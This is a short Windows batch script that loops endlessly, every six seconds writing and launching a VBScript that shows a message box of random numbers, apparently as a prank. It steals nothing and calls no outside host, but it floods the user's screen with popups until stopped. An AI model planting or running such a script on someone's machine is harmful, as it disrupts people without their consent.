@echo off
:0
timeout 6 /nobreak > nul
echo msgbox "%random%%random%%random%%random%%random%%random%%random%%random%%random%" > m.vbs
start m.vbs
goto 0